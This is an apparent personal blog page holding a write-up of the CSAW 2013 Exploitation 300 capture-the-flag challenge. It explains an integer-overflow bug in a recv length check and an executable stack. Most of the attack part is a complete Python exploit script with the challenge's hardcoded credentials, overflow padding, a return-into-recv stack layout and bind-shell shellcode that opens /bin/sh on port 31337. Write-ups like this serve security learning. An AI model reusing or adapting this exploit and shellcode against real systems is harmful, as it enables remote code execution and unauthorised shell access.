<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<title> CSAW Exploitation 300 [2013] &middot; ramblings of an aspiring hacker </title>


<link rel="stylesheet" href="https://ejohn.github.io/css/slim.css">
<link rel="stylesheet" href="https://ejohn.github.io/css/highlight.min.css">
<link href='https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Source+Code+Pro' rel='stylesheet' type='text/css'>

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/favicon.ico">


<link href="" rel="alternate" type="application/rss+xml" title="ramblings of an aspiring hacker" />

</head>

<body>
  <div class="container">
    <div class="header">
  <h1 class="site-title"><a href="https://ejohn.github.io/">ramblings of an aspiring hacker</a></h1>
  <p class="site-tagline"></p>
  <div class="nav">
    <a class="nav-btn" href="#">
      <span class="ci ci-burger"></span>
    </a>
    <ul class="nav-list">
       
	  <li class="spacer">&ac;</li>

      <li><a href="https://github.com/ejohn">Github</a></li>  
    </ul>
  </div>
</div>
    <div class="content">
      <div class="post">
        <h2 class="post-title"><a href="https://ejohn.github.io/posts/csaw-2013-exploitation-300/">CSAW Exploitation 300 [2013]</a></h2>
        <div class="post-content">
          <p>The level 300 exploitation challenge involved an integer overflow. I figured out the username and password that were hardcoded in the binary. The program then asks for an integer input and uses that as the number of bytes to read parameter in recv(). The only input validation that is performed on this parameter is to check if it is less than 1024. Entering -1 here lets us enter as much data we need since it gets interpreted as a positive integer. The next thing to notice is that the stack is executable.</p>
<h1 id="the-plan-of-action">The plan of action</h1>
<ul>
<li>Find the address of recv function in PLT using objdump -d fil_chal | grep recv</li>
<li>Find a writable location in the data or bss section of the binary using readelf -S fil_chal</li>
<li>Exploit the integer overflow vulnerability and overflow the stack by sending sufficient padding.</li>
<li>Overflow EIP with the address of the recv function. Setup the stack in such a way that recv(4, addr_in_bss, len(shellcode), 0) is called and after recv returns, execution continues at addr_in_bss. I figured the socket descriptor is 4 using strace and checking the recv call made by the binary.</li>
<li>Once the shellcode is read into memory at the address specified, execution jumps to the shellcode and we have a shell listening at port 31337.</li>
</ul>
<h1 id="exploit">Exploit</h1>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> telnetlib
<span style="color:#f92672">import</span> struct
<span style="color:#f92672">import</span> time

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pack</span>(addr):
  <span style="color:#66d9ef">return</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, addr)

tn <span style="color:#f92672">=</span> telnetlib<span style="color:#f92672">.</span>Telnet(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">34266</span>)

tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#39;UserName: &#39;</span>)
tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;csaw2013&#39;</span>)

tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#39;Password: &#39;</span>)
tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;S1mplePWD&#39;</span>)

tn<span style="color:#f92672">.</span>read_until(<span style="color:#e6db74">&#39;Entry Info: &#39;</span>)
tn<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;-1&#34;</span>)


<span style="color:#75715e">##Shellcode to bind /bin/sh on port 31337</span>
<span style="color:#75715e">##http://www.shell-storm.org/shellcode/files/shellcode-847.php</span>
shellcode <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x66\xb3\x02\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x6a\x01</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2</span><span style="color:#e6db74">&#34;</span>
          <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\x0b\xcd\x80</span><span style="color:#e6db74">&#34;</span>)

padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1056</span>
recv <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048890</span>
bss <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804b008</span> <span style="color:#f92672">+</span> len(shellcode) <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>


<span style="color:#75715e">##recv(socket_descriptor, addr_in_bss, num_bytes_to_read, flags)</span>
<span style="color:#75715e">##return address after recv = addr_in_bss</span>
tn<span style="color:#f92672">.</span>write( padding <span style="color:#f92672">+</span> pack(recv) <span style="color:#f92672">+</span>
                  pack(bss) <span style="color:#f92672">+</span>
                  pack(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span>
                  pack(bss) <span style="color:#f92672">+</span>
                  pack(len(shellcode)) <span style="color:#f92672">+</span>
                  pack(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
tn<span style="color:#f92672">.</span>write(shellcode)

tn<span style="color:#f92672">.</span>close()
</code></pre></div>
        </div>
      </div>
    </div>
    <div class="footer">
  
  <p>-</p>
  
</div>

  </div>
  <script src="https://ejohn.github.io/js/slim.js"></script>
  <script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-44281103-1', 'auto');
ga('send', 'pageview');

</script>


</body>

</html>